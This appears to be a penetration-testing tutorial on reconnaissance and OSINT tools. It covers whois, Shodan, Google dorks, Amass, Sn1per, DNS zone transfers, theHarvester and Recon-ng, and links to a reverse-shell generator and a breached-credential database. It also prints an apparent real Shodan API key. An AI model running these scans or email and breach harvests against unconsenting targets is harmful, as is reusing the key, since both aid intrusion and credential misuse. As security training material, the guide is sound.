## **Security Tools for Reconnaissance, OSINT, and Vulnerability Assessment**

In cybersecurity, reconnaissance and vulnerability assessment are key steps in identifying weaknesses in a system. Open-source intelligence (OSINT) tools and resources allow security professionals to collect critical data and perform in-depth analysis. Below is a comprehensive list of essential tools and resources to assist with reconnaissance, OSINT gathering, and vulnerability assessment.

**Web Shells and Penetration Testing Resources**

1. [**RevShells**](https://www.revshells.com/ "https://www.revshells.com/") A collection of reverse shells designed for penetration testing. These web shells are useful for gaining remote access to target servers through command injection.
    
2. [**Bugcrowd**](https://bugcrowd.com/ "https://bugcrowd.com/") A platform for ethical hackers to engage in bug bounty programs, allowing users to report vulnerabilities in exchange for rewards.
    
3. [**Hunter.io**](https://hunter.io/ "https://hunter.io/") A tool to discover email addresses associated with a specific domain. It is useful for uncovering potential contacts within a target organization.
    
4. [**Phonebook.cz**](https://phonebook.cz/ "https://phonebook.cz/") Similar to Hunter.io, Phonebook.cz helps to identify email addresses tied to a company’s domain, expanding your OSINT capabilities.
    
5. [**VoilaNorbert**](https://www.voilanorbert.com/ "https://www.voilanorbert.com/") An email discovery and verification tool that allows you to search for email addresses by entering a name and company domain.
    
6. [**EmailHippo**](https://tools.emailhippo.com/ "https://tools.emailhippo.com/") A service for verifying the legitimacy of email addresses, ensuring they are correctly formatted and active.
    
7. [**Email Checker**](https://email-checker.net/ "https://email-checker.net/") Another reliable email verification tool to ensure that email addresses are valid, properly formatted, and functional.
    
8. [**Crt.sh**](https://crt.sh/ "https://crt.sh/") A Certificate Transparency search engine that helps identify certificates issued for a domain and related subdomains, providing useful information for security assessments.
    
9. [**BuiltWith**](https://builtwith.com/ "https://builtwith.com/") A tool that reveals the technology stack behind any website, helping you to understand the software, tools, and platforms used.
    
10. **Alternative**: Use **Wappalyzer** (a browser extension) for on-the-fly detection of technologies and frameworks used behind websites.
    
11. [**Dehashed**](https://dehashed.com/ "https://dehashed.com/") A database of breached credentials that allows you to check whether your email or someone else’s has been involved in a data breach.
    
12. [**Explainshell**](https://explainshell.com/ "https://explainshell.com/") A resource for understanding shell commands by breaking them down and explaining each part, enhancing your command-line proficiency.
    

### **Metasploit2 (Mutillidae) Setup**

1. **Mutillidae Configuration**  Mutillidae is a vulnerable web application used for testing exploits with Metasploit.
    
2. To configure Mutillidae:
    

- Open a terminal and run the following command to switch to the root user:
    
	- sudo -i
    
	- Edit the Mutillidae configuration file:
    
	- vim /var/www/mutillidae/config.inc
    
	- Change the database name to owasp10: $dbname = 'owasp10';
    

## **Reconnaissance Phase Tools**

The reconnaissance phase is essential for gathering intelligence on a target. Below are tools to help identify vulnerabilities, map attack surfaces, and collect valuable data.

## **1.** **Whois Lookup Tutorial**

### **1. Basic Whois Query**

#### _**Retrieve Domain Registration Details**_

**Command:**

whois example.com

**Description:** Retrieves the Whois information for the domain example.com. This includes details about:

- Registrant name and contact information.
    
- Domain status and expiry dates.
    
- Nameservers and registrar information.
    

#### _**Retrieve Whois Information for Another Domain**_

**Command:**

whois zonetranfer.me

**Description:** Similar to the previous command, retrieves the Whois data for the domain zonetranfer.me. Useful for analyzing domain ownership and registration details.

#### _**Retrieve Whois Information for an IP Address**_

**Command:**

whois 170.178.183.18

**Description:** Fetches the Whois information for the IP address 170.178.183.18. This provides details about:

- IP allocation and ownership.
    
- Associated organization or ISP.
    
- Geographical location of the IP.
    

### **2. Extract Organization Information**

#### _**Use**_ _**grep**_ _**to Filter Whois Data**_

**Command:**

whois example.com | grep OrgName

**Description:** Filters the Whois results for the domain example.com to display only the organization name (OrgName). This is particularly useful for quickly identifying the owning entity of a domain.

### **3. Whois Services**

#### _**DomainTools Whois**_

DomainTools provides a popular online service for querying detailed domain registration information. It offers:

- Historical Whois records.
    
- Reverse Whois lookup.
    
- Advanced search filters.
    

#### _**ARIN Whois**_

The American Registry for Internet Numbers (ARIN) offers a Whois service primarily focused on IP address queries. It provides:

- Information about IP address allocation.
    
- Details of ISPs and network operators.
    
- Contact details for IP-related issues.
    

### **Practical Use Cases**

- **Domain Analysis:** Identify ownership, registrar, and registration details for domains.
    
- **IP Investigation:** Analyze IP ownership and geographical information.
    
- **Security Audits:** Verify domain and IP details during reconnaissance.
    

### **Notes:**

- Whois information may be limited by privacy protections or GDPR regulations.
    
- Ensure proper authorization and compliance with local laws when using Whois data for investigations.
    

## **2.** **Sublist3r Tutorial**

### **1. Installation**

**Command:**

sudo apt install sublist3r -y

**Description:** This command installs Sublist3r, a tool for subdomain enumeration, on a Linux system. The options include:

- **sudo apt install sublist3r****:** Installs Sublist3r using the apt package manager.
    
- **-y****:** Automatically confirms the installation without prompting for user input.
    

Sublist3r simplifies the process of discovering subdomains associated with a domain, aiding in reconnaissance and penetration testing.

### **2. Usage**

#### _**Discover Subdomains for a Target Domain**_

**Command:**

sublist3r -d example.com -t 3

**Description:** Runs Sublist3r to enumerate subdomains for the domain example.com. The options include:

- **-d example.com****:** Specifies the target domain.
    
- **-t 3****:** Sets the number of threads to 3, allowing parallel processing to speed up the enumeration process.
    

#### _**Use External Sources for Additional Subdomain Discovery**_

**Command:**

sublist3r -d zonetranfer.me -e google,yahoo

**Description:** Runs Sublist3r for the domain zonetranfer.me and leverages external sources for enhanced discovery. The options include:

- **-e google,yahoo****:** Specifies external sources (e.g., Google, Yahoo) to include in the search. Multiple sources are separated by commas.
    

### **Practical Use Cases**

- **Subdomain Enumeration:** Identify subdomains associated with a target domain for reconnaissance.
    
- **Threat Assessment:** Detect potential weak points or unprotected subdomains.
    
- **Augmented Discovery:** Use external search engines and APIs for a more comprehensive subdomain list.
    

### **Notes:**

- Sublist3r supports multiple sources, including search engines, DNS APIs, and other services.
    
- Always obtain proper authorization before performing subdomain enumeration on any domain.
    

## **3.** **WhatWeb**

### **1. Identify Technologies Used on a Website**

**Command:**

whatweb https://example.com

**Description:** This command uses WhatWeb to identify the technologies and frameworks utilized on the website https://example.com. It provides information about the website’s technology stack, such as:

- **Web server:** The type and version of the web server hosting the website.
    
- **CMS (Content Management System):** If the site uses a CMS like WordPress, Joomla, or Drupal.
    
- **Plugins and frameworks:** Detects various plugins, libraries, and frameworks in use.
    
- **Analytics and tracking:** Identifies analytics platforms or tracking tools embedded in the site.
    

### **Practical Use Cases**

- **Technology Reconnaissance:** Determine the underlying technologies of a target website.
    
- **Security Assessment:** Analyze the technologies for known vulnerabilities.
    
- **Competitor Analysis:** Understand the tech stack of competitors for benchmarking purposes.
    

### **Notes:**

- WhatWeb is a command-line tool that simplifies web reconnaissance.
    
- Always ensure proper authorization before running WhatWeb on any target site.
    

## **4.** **Infoga Tutorial**

### **GitHub Repository**

Infoga is a powerful tool designed to collect email addresses and related information from breaches and other publicly accessible sources. To learn more, visit the [official GitHub repository](https://github.com/m4ll0k/Infoga "https://github.com/m4ll0k/Infoga"), which includes detailed documentation, examples, and the source code.

### **1. Command to Collect Email Data**

**Command:**

python3 infoga.py --domain example.com --source all --breach

**Description:** This command uses Infoga to gather email-related information for the domain example.com. It performs the following actions:

- **Domain targeting:** The --domain option specifies the target domain (example.com) for email data collection.
    
- **All data sources:** The --source all flag directs Infoga to query all available data sources to maximize the scope of the search.
    
- **Breach checking:** The --breach flag enables the tool to search for potential breaches associated with the collected email addresses, identifying if any of them have been exposed in known data leaks.
    

### **Practical Use Cases**

- **Email Reconnaissance:** Identify publicly available email addresses associated with a domain.
    
- **Breach Analysis:** Detect if collected emails have been exposed in past breaches.
    
- **Penetration Testing:** Assess potential email-related vulnerabilities during a security audit.
    

### **Notes:**

- Infoga requires Python 3 to run. Ensure you have Python 3 installed on your system.
    
- Always use Infoga ethically and obtain proper authorization before collecting information related to any domain.
    

## **5.** **Shodan Tutorial**

### **Shodan Website**

To learn more about Shodan and its capabilities, visit the [official Shodan website](https://www.shodan.io/ "https://www.shodan.io/"). It provides detailed documentation, tutorials, and access to the web interface for exploring internet-connected devices and services.

### **Shodan from the Command Line Interface (CLI)**

#### _**1. Initialize Shodan with Your API Key**_

**Command:**

shodan init IgefuA30EpEsEPJGFSzli4AjOe4YhLo9

**Description:** This command initializes Shodan with your personal API key (IgefuA30EpEsEPJGFSzli4AjOe4YhLo9). The API key is required to authenticate and use Shodan’s CLI tools. Replace the example key with your actual API key.

#### _**2. Count Devices Running Postfix**_

**Command:**

shodan count postfix

**Description:** Retrieves the total number of devices or services indexed by Shodan that are running the Postfix mail server. This is useful for determining the global distribution of Postfix installations.

#### _**3. Count Devices Running Cisco IOS**_

**Command:**

shodan count cisco-ios

**Description:** Finds the count of devices or services running Cisco IOS, a widely used network operating system for Cisco devices. This can help in assessing the prevalence of Cisco IOS devices worldwide.

#### _**4. Retrieve Information About a Specific Host (IP: 172.85.4.252)**_

**Command:**

shodan host 172.85.4.252

**Description:** Provides detailed information about the host at the IP address 172.85.4.252. This may include open ports, running services, geographic location, and associated organization.

#### _**5. Retrieve Information About a Specific Host (IP: 107.161.176.250)**_

**Command:**

shodan host 107.161.176.250

**Description:** Similar to the previous command, this retrieves detailed information about the host at the IP address 107.161.176.250. It’s useful for analyzing specific targets.

#### _**6. Search for "exim"**_

**Command:**

shodan search exim

**Description:** Searches for devices or services related to exim, a mail transfer agent. This command provides a list of indexed results containing information about systems running Exim.

#### _**7. Display Help for the Shodan Search Command**_

**Command:**

shodan search -h

**Description:** Displays help information for the shodan search command. This includes a list of available options, their usage, and examples for refining search queries.

#### _**8. Search for "exim" with Specific Fields and Limit the Results to 10**_

**Command:**

shodan search --fields "ip_str,domain,org" --limit 10 exim

**Description:** Performs a search for the exim service, limits the results to 10 entries, and displays specific fields:

- **IP address (****ip_str****)**
    
- **Domain (****domain****)**
    
- **Organization (****org****)** This helps in quickly extracting targeted information from the Shodan database.
    

#### _**9. Display Help for the Shodan Download Command**_

**Command:**

shodan download -h

**Description:** Shows the help information for the shodan download command, explaining how to download search results in various formats for offline analysis.

#### _**10. Display Help for the Shodan Parse Command**_

**Command:**

shodan parse -h

**Description:** Provides help information for the shodan parse command, which is used to parse downloaded Shodan data into structured formats for further analysis.

#### _**11. Display Help for the Shodan Convert Command**_

**Command:**

shodan convert -h

**Description:** Displays the help information for the shodan convert command. This command is used to convert Shodan data into different formats compatible with other tools.

### **Practical Use Cases**

- **Asset Discovery:** Identify devices and services exposed to the internet.
    
- **Security Assessment:** Analyze the configuration of devices and detect vulnerabilities.
    
- **Network Analysis:** Study the prevalence and distribution of specific technologies or software.
    

### **Notes:**

- Always ensure proper authorization when analyzing IPs or domains.
    
- Shodan CLI requires a valid API key, which can be obtained from your Shodan account.
    

**6.** **Censys**

- **Website** [Censys](https://censys.io/ "https://censys.io/") is a powerful search engine for internet-connected devices, SSL certificates, and other digital assets. It helps security researchers and network administrators discover and analyze various devices and services exposed on the internet.
    

## **7.** **Google Hacking Tutorial**

### **1. Search for a Specific Term on a Website**

**Command:**

site:www.example.com password123

**Description:** This search queries Google for the term password123 specifically on the website www.example.com. It is useful for locating pages that contain a particular keyword or term on a specific domain.

### **2. Search for Any Page on a Website**

**Command:**

site:example.com

**Description:** This command retrieves all indexed pages for the domain example.com. It allows you to view the entire indexed structure of the website as seen by Google, which is helpful for reconnaissance or analyzing a website’s public-facing content.

### **3. Search for Pages with "admin" in the URL**

**Command:**

site:example.com inurl:admin

**Description:** Searches for pages on example.com that have the term admin in their URL. This is particularly useful for identifying administrative pages or portals that might require additional security scrutiny.

### **4. Search for Pages with "forum" in the URL**

**Command:**

site:example.com inurl:forum

**Description:** Finds pages on example.com that include the term forum in their URL. This is helpful for locating discussion boards or community pages on the target domain.

### **5. Search for Pages with "intranet" in the Title**

**Command:**

intitle:intranet

**Description:** Searches for pages where the title contains the word intranet. This can be used to locate internal resources or private network-related pages that are accidentally exposed to the web.

### **6. Search for Pages with "intranet" in the URL**

**Command:**

inurl:intranet

**Description:** Finds pages where the URL contains the word intranet. This search is valuable for identifying potentially sensitive internal resources exposed online.

### **7. Search for Pages with "video" in the Text on a Website**

**Command:**

site:www.example.com intext:video

**Description:** Queries for pages on www.example.com that include the word video in their textual content. This is useful for pinpointing specific content types on a website.

### **8. Search for PDF Files with the Term "Report"**

**Command:**

filetype:pdf report

**Description:** Searches the web for PDF files containing the word report. This is an effective way to locate publicly accessible reports or documents in PDF format.

### **Practical Use Cases**

- **Reconnaissance:** Identify sensitive information exposed through indexed pages.
    
- **Content Analysis:** Gain insights into the type of content a website hosts.
    
- **Resource Discovery:** Find administrative pages, forums, or document files related to the target.
    

### **Notes:**

- Always use Google Hacking responsibly and ensure proper authorization when analyzing websites or domains.
    
- Combine multiple search operators for more targeted results (e.g., site:example.com filetype:pdf intext:confidential).
    

## **8.** **Metagoofil Tutorial**

### **1. Extract Metadata from Documents on a Target Domain**

**Command:**

metagoofil -d example.com -t doc,pdf,ppt,pptx -l 50 -n 25 -o profile -f

**Description:** This command uses Metagoofil to extract metadata from documents like PDFs, DOCs, and PPTs available on the target domain example.com. Metadata extraction can reveal valuable information such as usernames, software versions, and internal paths that can assist in reconnaissance efforts. Below is a detailed breakdown of the command options:

- **-d example.com****:** Specifies the target domain for the search. All document searches will be limited to this domain.
    
- **-t doc,pdf,ppt,pptx****:** Limits the search to specific file types: DOC, PDF, PPT, and PPTX. These are common document formats that often contain metadata.
    
- **-l 50****:** Limits the search to 50 pages of results. This controls how many search engine result pages Metagoofil will analyze.
    
- **-n 25****:** Specifies the number of documents to download for metadata extraction. In this case, it will retrieve 25 files.
    
- **-o profile****:** Defines the output directory where the extracted metadata will be saved. In this example, the folder is named profile.
    
- **-f****:** Forces the extraction of metadata from the downloaded documents. This ensures that Metagoofil processes all files regardless of potential issues like file size or format anomalies.
    

### **Practical Use Cases**

- **Reconnaissance:** Understanding the technologies and tools used by the target organization.
    
- **Footprinting:** Identifying internal information such as usernames, email addresses, and file paths that can aid in penetration testing.
    

### **Notes:**

- Ensure you have proper authorization before conducting scans or extracting metadata from any domain.
    
- Use filters wisely (-t) to focus on file types most likely to contain useful metadata.
    
- Metadata extraction can yield sensitive information; handle it responsibly.
    

## **9****. Amass Tutorial**

### **1. Display Help for the Enum Command**

**Command:**

amass enum -h

**Description:** This command displays detailed help information for the enum command, including its usage, available options, and examples. Use this to understand the functionality of the enum command and its parameters.

### **2. Enumerate Subdomains for a Domain and Save Results**

**Command:**

amass enum -d example.com -src -ip -dir example

**Description:** Enumerates subdomains for the domain example.com. It includes the following:

- **Sources of the subdomains:** The -src flag displays the sources from which subdomains were discovered.
    
- **IP addresses:** The -ip flag retrieves the associated IP addresses for the subdomains.
    
- **Save results:** The -dir example option specifies the directory (example) where the results will be saved.
    

### **3. Enumerate Subdomains with No Recursion**

**Command:**

amass enum -d nasa.gov -src -ip -norecursive

**Description:** Enumerates subdomains for the domain nasa.gov without recursion. This means Amass will not recursively query deeper levels of subdomains. It includes the sources and IP addresses of the subdomains using the -src and -ip flags, respectively.

### **4. Brute Force Subdomain Enumeration**

**Command:**

amass enum -d example.com -src -ip -brute -dir example

**Description:** Performs brute force subdomain enumeration for the domain example.com. It includes the following:

- **Brute forcing:** Enabled with the -brute flag to discover additional subdomains.
    
- **Sources and IP addresses:** Retrieved using the -src and -ip flags.
    
- **Save results:** The results are saved in the specified directory (example) using the -dir example option.
    

### **5. Navigate to the Brute Force Wordlist Directory**

**Command:**

cd /usr/share/amass/wordlist

**Description:** Changes the current directory to /usr/share/amass/wordlist, where Amass’s default wordlist for brute force enumeration is stored. This directory contains pre-defined wordlists that can be used to enhance brute force operations.

### **6. Intel Command for ASN (Autonomous System Number) Lookup**

**Command:**

amass intel -asn 3561

**Description:** Queries Amass for information about the specified ASN (Autonomous System Number) 3561. This provides details about the networks associated with the ASN, which can be useful for reconnaissance.

### **7. Intel Command for WHOIS Information**

**Command:**

amass intel -whois -d example.com -dir example

**Description:** Retrieves WHOIS information for the domain example.com. The -whois flag fetches the WHOIS records, and the results are saved in the specified directory (example) using the -dir example option.

### **8. List All Databases in the Specified Directory**

**Command:**

amass db -dir example -list

**Description:** Lists all Amass databases located in the specified directory (example). This helps in managing and reviewing stored enumeration data.

### **9. Show Specific Enumeration Results from the Database**

**Command:**

amass db -dir example -enum 1 -show

**Description:** Retrieves and displays results for a specific enumeration (in this case, enumeration 1) from the database stored in the specified directory (example). This allows for detailed review of previously conducted enumerations.

### **Notes:**

- Amass is a powerful tool for subdomain enumeration, network reconnaissance, and information gathering.
    
- Always ensure proper authorization before conducting scans on any domain.
    

## **10.** **Sn1per Tutorial**

### **1. Clone the Sn1per Repository from GitHub**

**Command:**

sudo git clone https://github.com/1N3/Sn1per.git

**Description:** Clones the Sn1per repository from GitHub to your local machine. The options include:

- **sudo****:** Ensures the command is executed with elevated privileges.
    
- **git clone****:** Downloads the repository.
    
- **https://github.com/1N3/Sn1per.git****:** The URL of the Sn1per repository.
    

### **2. Navigate to the Sn1per Directory**

**Command:**

cd Sn1per

**Description:** Changes the current directory to the Sn1per folder after cloning the repository. This step is required before running the installation script.

### **3. Run the Installation Script**

**Command:**

sudo bash install.sh

**Description:** Executes the installation script (install.sh) to install Sn1per and its dependencies. The options include:

- **sudo****:** Ensures the script runs with necessary administrative privileges.
    
- **bash install.sh****:** Executes the installation script.
    

### **4. Switch to Root User**

**Command:**

sudo -i

**Description:** Switches to the root user to run Sn1per with the required permissions. This step is important for executing Sn1per commands that need elevated access.

### **5. Display Help Information for Sn1per**

**Command:**

sniper -h

**Description:** Displays the help menu for Sn1per, listing all available commands and options. This is useful for understanding the tool’s capabilities and how to use it effectively.

### **6. Run Sn1per Against a Target Domain**

**Command:**

sniper -t example.com

**Description:** Executes Sn1per against the target domain example.com, performing a full enumeration and vulnerability scan. The options include:

- **-t example.com****:** Specifies the target domain for the scan.
    

### **7. View the Generated Report in HTML Format**

**Command:**

cd /usr/share/sn1per/loot/workspace/example.com/reports/

**Description:** Navigates to the directory containing the HTML report generated for the target domain example.com. This report provides detailed findings from the scan.

### **8. View the List of Discovered Vulnerabilities**

**Command:**

cd /usr/share/sn1per/loot/vulnerabilities/

**Description:** Navigates to the folder containing the vulnerabilities discovered during the scan. This directory stores detailed information about identified issues.

### **Practical Use Cases**

- **Comprehensive Scanning:** Automate enumeration and vulnerability discovery for target domains.
    
- **Report Generation:** Generate HTML reports for easy sharing and analysis.
    
- **Vulnerability Management:** Access and manage detailed lists of discovered vulnerabilities.
    

### **Notes:**

- Ensure you have proper authorization before scanning any domain.
    
- Run Sn1per as the root user to avoid permission issues.
    

**11.** **DNS Tools**

1. **Using nslookup**  The nslookup tool is used to query DNS records for a specific domain. Here’s how to use it:
    

- nslookup example.com  This command queries the default DNS server for the DNS records of the domain "example.com." It will return the IP address and other relevant records for the domain.
    

1. **Additional nslookup options**  You can modify the nslookup query using various options:
    

- set type=MX  This option specifies the type of DNS record to query. In this case, it will query the Mail Exchange (MX) records, which are used for mail servers.
    
- server 1.1.1.1  Use this option to specify a particular DNS server. In this example, it’s set to Cloudflare’s DNS server (1.1.1.1), which can offer faster responses and additional privacy benefits.
    
- example.com  Once the DNS server is set, you can issue a query for the desired domain. In this case, querying for "example.com."
    

1. **Using dig**  The dig (Domain Information Groper) command is another tool for querying DNS records and is often preferred for its flexibility and detailed output.
    

- dig example.com  This command queries the default DNS server for the domain "example.com" and provides detailed information about its DNS records, including A records, TTL (Time-to-Live), and authoritative nameservers.
    
- dig example.com +short  This command retrieves a shortened version of the DNS record for "example.com," typically displaying only the IP address of the domain.
    
- dig example.com MX +short  This command queries for the Mail Exchange (MX) records of "example.com," which are used to identify mail servers. The +short flag provides a more concise output.
    

1. **Using dnsenum** dnsenum is a tool used for DNS enumeration, helping to gather information about a domain’s DNS records and subdomains.
    

- dnsenum example.com  Running this command will perform a DNS enumeration for the domain "example.com," providing detailed information about its DNS records, including subdomains and possible zone transfers.
    

1. **Using dnsrecon** dnsrecon is a powerful tool for DNS reconnaissance, useful for discovering DNS records and vulnerabilities.
    

- dnsrecon -d zonetranfer.me  This command runs DNS reconnaissance on the domain "zonetranfer.me" to gather various types of DNS records (A, MX, CNAME, etc.), helping you analyze the domain’s structure and security.
    

1. **Using fierce** fierce is a DNS scanning and enumeration tool that can help identify subdomains, DNS records, and possible weaknesses in a domain’s DNS setup.
    

- fierce --domain example.com  This command performs a DNS scan against "example.com" to identify subdomains and gather other useful information related to the domain’s DNS configuration.
    

1. **Online DNS Lookup - DNSDumpster**  If you prefer a user-friendly interface, you can use online DNS tools like DNSDumpster. This tool provides an easy-to-use interface for discovering DNS records and subdomains without requiring command-line knowledge. Simply enter a domain to access its records.
    

### **Zone Transfer**

1. **What is a Zone Transfer?**  A zone transfer (AXFR) is a mechanism that allows a DNS server to share its entire database of DNS records with another server. This can be useful for backup, replication, or gathering a complete list of records for a domain. Zone transfers are often misconfigured and can be exploited for reconnaissance purposes.
    
2. **Using dnsenum for Zone Transfer** dnsenum can be used to automatically attempt a zone transfer for a domain. If the DNS server is misconfigured, this may return a complete list of DNS records for the domain.
    

- dnsenum zonetransfer.me  This command automatically attempts a zone transfer for the domain "zonetransfer.me" to gather DNS records from the server.
    

1. **Using dig for Zone Transfer**  The dig command can be used to manually attempt a zone transfer by specifying the AXFR option.
    

- dig axfr @nsztm1.digi.ninja zonetransfer.me  This command attempts a zone transfer (AXFR) from the DNS server "nsztm1.digi.ninja" for the domain "zonetransfer.me." If the zone transfer is allowed, it will return all DNS records for the domain.
    

1. **Using fierce for Zone Transfer** fierce can also be used to scan for zone transfer information, checking if a domain’s DNS records are exposed.
    

- fierce --domain zonetransfer.me  This command runs a scan for "zonetransfer.me," including any available zone transfer information. If the server is misconfigured, it may reveal all DNS records for the domain.
    

**12.** **WAFW00f**

WAFW00f is a tool used to detect the presence of Web Application Firewalls (WAFs) on a target domain. It can identify a wide range of WAFs by analyzing the HTTP responses from a domain and determining if they match known WAF patterns. This is useful for security testing, as it helps to understand if a site is protected by a WAF, and which type.

#### _**1. Basic Command**_

The basic command for running WAFW00f is straightforward. It checks whether a Web Application Firewall is present on the specified domain and attempts to identify which type of WAF is being used.

- **Command:** wafw00f zonetranfer.me  This command runs WAFW00f against the domain "zonetranfer.me." It will analyze the site's HTTP responses and check for signs of a WAF. If a WAF is detected, it will provide information about the WAF type (if identifiable). If no WAF is found, it will indicate that the domain is likely unprotected by a WAF.
    

#### _**2. Advanced Command**_

WAFW00f offers an advanced scanning mode, which uses more aggressive methods to detect WAFs. This is helpful in cases where the basic scan does not return results or if the WAF is well-concealed and may not be easily detected by default techniques.

- **Command:** wafw00f zonetranfer.me -a  This command runs WAFW00f against "zonetranfer.me" but with the -a flag, which activates the aggressive scanning mode. The aggressive scan sends a broader range of requests, increasing the chances of bypassing any evasion techniques used by the WAF. It can also be helpful when trying to detect more obscure or sophisticated WAFs.
    

## **Combination Reconnaissance Tools**

Several powerful frameworks combine multiple reconnaissance techniques into one unified tool set.

**1.** **TheHarvester**

1. **Basic Command: Enumerate emails and subdomains** theHarvester -d example.com -l 100 -b all  Runs TheHarvester to gather information about the domain example.com from all available sources (-b all), limiting the results to 100 entries (-l 100).
    
2. **Search using LinkedIn** theHarvester -d example.com -b linkedin  Uses LinkedIn as the data source to search for information related to the domain example.com.
    
3. **Search using DNSDumpster** theHarvester -d example.com -b dnsdumpster  Queries DNSDumpster as the data source to gather information on the domain example.com.
    
4. **Search across multiple sources (Google, Bing, Yahoo, DuckDuckGo)** theHarvester -d example.com -l 500 -b google,bing,yahoo,duckduckgo  Gathers information about example.com from multiple sources (Google, Bing, Yahoo, and DuckDuckGo), limiting the results to 500 entries (-l 500).
    
5. **Command with colored output** theHarvester -d example.com -l 500 -c  Runs TheHarvester with 500 results (-l 500), and enables colored output (-c) for better visibility in the terminal.
    
6. **Command with no duplicates** theHarvester -d example.com -l 500 -b google,bing,yahoo,duckduckgo -n  Uses multiple search engines (Google, Bing, Yahoo, DuckDuckGo) to gather up to 500 results (-l 500), ensuring no duplicate entries (-n).
    

**2.** **OSINT Framework**

The OSINT (Open Source Intelligence) Framework is a collection of tools and resources designed to aid in gathering publicly available information from various sources on the internet. It helps with investigations, research, and reconnaissance by providing a structured way to access OSINT resources.

#### _**1. Official OSINT Framework Website**_

The OSINT Framework website serves as the central hub for exploring different OSINT tools, categorized by type and use case. It is a comprehensive resource for gathering intelligence from public sources.

- **Link:** [Visit the official OSINT Framework](https://osintframework.com/ "https://osintframework.com/")  This website allows you to explore various OSINT categories such as search engines, social media, WHOIS data, geolocation, and more. It organizes tools and resources to help you quickly locate the information you need for your investigation.
    

#### _**2. GitHub Repository for OSRFramework**_

OSRFramework is a powerful tool designed for automating the process of gathering Open Source Intelligence. It integrates with several OSINT services and can be used for various intelligence-gathering tasks.

- **Link to Repository:** [OSRFramework GitHub Repository](https://github.com/i3visio/osrframework "https://github.com/i3visio/osrframework")  You can find the official repository for OSRFramework here. This repository contains all the source code, documentation, and installation instructions necessary for using OSRFramework. It provides access to a collection of Python scripts designed to query and retrieve information from different OSINT sources.
    

#### _**3. Install OSRFramework**_

To use OSRFramework, you first need to install it on your system. The installation process is simple and can be done using your system's package manager if you're using a Linux-based system like Ubuntu.

- **Command for Installation:** sudo apt install osrframework  This command installs OSRFramework using the package manager apt on Ubuntu or other Debian-based systems. After running this command, OSRFramework will be installed and ready to use. You may need root privileges to execute the command.
    

#### _**4. Usage: Run usufy.py Script**_

Once OSRFramework is installed, you can use it to gather OSINT data related to specific domains or other targets. One of the scripts available in OSRFramework is usufy.py, which is designed to collect detailed information about a domain.

- **Command to Run the Script:** usufy.py -n example.com  This command runs the usufy.py script with the -n flag to specify the target domain (in this case, "example.com"). The script will retrieve various OSINT details about the domain, such as WHOIS information, DNS records, historical data, and any publicly available information about the domain.
    

**3.** **Recon-ng**

Recon-ng is a powerful web reconnaissance framework designed for gathering information and performing OSINT (Open Source Intelligence) tasks. It provides a robust command-line interface for managing workspaces, adding domains, utilizing external APIs, and using modules from its marketplace for specific reconnaissance tasks.

### **1. Start Recon-ng**

The first step in using Recon-ng is to launch the framework. This will start the Recon-ng environment, allowing you to interact with it and perform your reconnaissance tasks.

- **Command:** recon-ng  Running this command will start the Recon-ng environment, where you will be able to enter various commands to manage workspaces, run modules, and conduct reconnaissance on target domains.
    

### **Workspace Management**

Workspaces in Recon-ng help you organize your data by target domain or organization. Each workspace can store information about domains, companies, and other reconnaissance data.

#### _**1. Create a New Workspace**_

To begin working with a new domain or project, create a new workspace that corresponds to the target you’re investigating.

- **Command:** workspaces add example.com  This command creates a new workspace named **example.com**. You can then add domains, companies, and other relevant data related to this target into this workspace.
    

#### _**2. Add Domains to the Workspace**_

Once a workspace is created, you can start adding specific domains to track them in your reconnaissance efforts.

- **Command:** add domains www.example.com  This command adds the domain [**www.example.com**](http://www.example.com/ "http://www.example.com/") to the current workspace. This helps you collect information related to this specific domain.
    

#### _**3. Add a Company to the Workspace**_

You can also add companies to the workspace to track information related to a specific organization, helping to associate domains with their respective organizations.

- **Command:** add companies EXAMPLE  This command adds the company **EXAMPLE** to your current workspace. It allows you to associate reconnaissance data with the company to provide a more organized view of the information.
    

#### _**4. Show the Domains in the Workspace**_

You can view all the domains that have been added to your current workspace. This is helpful for tracking and reviewing all the domains associated with your investigation.

- **Command:** show domains  This command lists all domains currently added to the workspace, allowing you to quickly view which domains are being tracked.
    

#### _**5. Show the Companies in the Workspace**_

In addition to domains, you can also see the companies added to the workspace. This helps you manage and track the organizations you're researching.

- **Command:** show companies  This command displays a list of companies currently in the workspace, so you can easily see which organizations have been added.
    

### **API Keys Management**

Recon-ng supports the integration of external APIs such as Shodan and Censys, which enhance the framework's reconnaissance capabilities. To use these APIs, you need to add their respective API keys to your Recon-ng environment.

#### _**1. Add Shodan API Key**_

Shodan is a search engine for internet-connected devices. To integrate Shodan with Recon-ng, you must provide your Shodan API key.

- **Command:** keys add shodan_api <API_KEY>  Replace <API_KEY> with your actual Shodan API key. This command adds the Shodan API key to Recon-ng, enabling you to access Shodan data through the framework.
    

#### _**2. Add Censys API Key**_

Censys is another useful tool for discovering data about devices and services on the internet. To integrate Censys with Recon-ng, you must add your Censys API key.

- **Command:** keys add censys_api <API_KEY>  Replace <API_KEY> with your actual Censys API key. This command adds the Censys API key to Recon-ng for querying Censys data directly within the framework.
    

### **Marketplace Management**

Recon-ng offers a marketplace where you can find and install additional modules that expand the capabilities of the framework. These modules help with various types of reconnaissance tasks, such as domain discovery, vulnerability scanning, and more.

#### _**1. Search for Modules in the Marketplace**_

You can search the marketplace to find available modules that can be installed and used in your reconnaissance tasks.

- **Command:** marketplace search  This command searches for available modules in the Recon-ng marketplace. You can use this to find modules that are relevant to your investigation.
    

#### _**2. Install All Available Marketplace Modules**_

If you want to install all modules from the marketplace at once, you can use this command.

- **Command:** market install all  This installs all available modules from the marketplace, ensuring that you have access to all the tools provided by Recon-ng.
    

#### _**3. Install a Specific Module (e.g., hackertarget)**_

You can install a specific module if you need it for a particular reconnaissance task, such as the **hackertarget** module for domain-host reconnaissance.

- **Command:** marketplace install hackertarget  This command installs the **hackertarget** module, which helps you gather information on domain hosts.
    

#### _**4. Load a Module**_

Once you've installed a module, you need to load it before running it. This loads the module into your session so you can use it.

- **Command:** modules load recon/domains-host/hackertarget  This command loads the **hackertarget** module for domain-host reconnaissance. After loading it, you can run it to gather domain-specific data.
    

#### _**5. Set the Source for the Module**_

Some modules require you to specify the source, such as the target domain you are focusing on.

- **Command:** option set SOURCE example.com  This sets the target domain **example.com** as the source for the module, ensuring that the module works with the correct domain.
    

#### _**6. View Module Information**_

To get more details about the currently loaded module, you can view its description and functionality.

- **Command:** info  This command displays information about the currently loaded module, including its purpose, available options, and instructions for use.
    

#### _**7. View Module Input Options**_

Many modules require input parameters to work effectively. You can view the necessary input options before running the module.

- **Command:** input  This command shows the input options required for the currently loaded module, helping you configure it properly before running it.
    

